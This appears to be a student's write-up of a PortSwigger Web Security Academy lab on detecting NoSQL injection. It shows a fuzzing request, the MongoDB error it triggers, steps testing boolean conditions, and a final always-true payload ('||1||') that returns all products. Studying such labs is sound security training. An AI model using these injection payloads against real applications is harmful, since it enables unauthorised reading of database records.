# Lab 1: Detecting NoSQL injection

```
GET /filter?category=Pets'%22%60%7B%20%3B%24Foo%7D%20%24Foo%20%5CxYZ HTTP/1.1
Host: 0a8c001604495d9180c60dd0006c004a.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Referer: https://0a8c001604495d9180c60dd0006c004a.web-security-academy.net/
Cookie: session=d82ldTNqdPOXGQFfW3TXmFcwNInibcG3
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: magenta
Priority: u=0, i


```

This causes an internal server error

```
HTTP/1.1 500 Internal Server Error
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 2793

<!DOCTYPE html>
<html>

<head>
    <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
    <link href=/resources/css/labs.css rel=stylesheet>
    <title>Detecting NoSQL injection</title>
</head>
<script src="/resources/labheader/js/labHeader.js"></script>
<div id="academyLabHeader">
    <section class='academyLabBanner'>
        <div class=container>
            <div class=logo></div>
            <div class=title-container>
                <h2>Detecting NoSQL injection</h2>
                <a id='lab-link' class='button' href='/'>Back to lab home</a>
                <a class=link-back href='https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection'>
                    Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                        <g>
                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                        </g>
                    </svg>
                </a>
            </div>
            <div class='widgetcontainer-lab-status is-notsolved'>
                <span>LAB</span>
                <p>Not solved</p>
                <span class=lab-status-icon></span>
            </div>
        </div>
</div>
</section>
</div>
<div theme="">
    <section class="maincontainer">
        <div class="container is-page">
            <header class="navigation-header">
            </header>
            <h4>Internal Server Error</h4>
            <p class=is-warning>Command failed with error 139 (JSInterpreterFailure): &apos;SyntaxError: malformed hexadecimal character escape sequence :
                functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25
                &apos; on server 127.0.0.1:27017. The full response is {&quot;ok&quot;: 0.0, &quot;errmsg&quot;: &quot;SyntaxError: malformed hexadecimal character escape sequence :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n&quot;, &quot;code&quot;: 139, &quot;codeName&quot;: &quot;JSInterpreterFailure&quot;}</p>
        </div>
    </section>
</div>
</body>

</html>
```

Note that sending a `'` character results in an error

![[attachments/Pasted image 20250726143846.png]]

Sending a valid JS payload fixes the error

![[attachments/Pasted image 20250726143937.png]]

Check conditional behavior. Note that when we send a negative conditional, no products are shown

![[attachments/Pasted image 20250726144101.png]]

> [!warning] Make sure to URL encode this

Now when we send a truthy value, products are returned.

![[attachments/Pasted image 20250726144840.png]]

Now sending an "or 1=1" payload we can get all products listed

![[attachments/Pasted image 20250726145050.png]]

Final payload

```
'||1||'
```

